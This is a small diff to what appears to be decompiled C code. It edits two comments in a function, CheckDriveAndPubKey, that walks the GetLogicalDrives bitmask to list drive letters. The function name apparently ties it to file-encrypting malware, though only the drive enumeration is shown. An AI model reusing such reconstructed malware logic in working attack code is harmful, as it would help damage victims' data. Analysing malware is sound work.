@@ -994,7 +994,7 @@ HANDLE  CheckDriveAndPubKey() // returns thread handle
 	do
 	{
 		index = (1 << v1); //nb of disks
-		if ((1 << v1) & v0)
+		if ((1 << v1) & v0) // check if the bit of GetLogicalDrives was set for the drive number
 		{
 			RootPathName[0] = v1 + 65;
 			RootPathName[1] = 58;
@@ -1017,7 +1017,7 @@ HANDLE  CheckDriveAndPubKey() // returns thread handle
 			}
 		}
 		--v1;
-	} while (v1 >= 0); // checks each letter from 31 to 0
+	} while (v1 >= 0); // checks each drive from 31 to 0 bit
 	return result;
 }
 
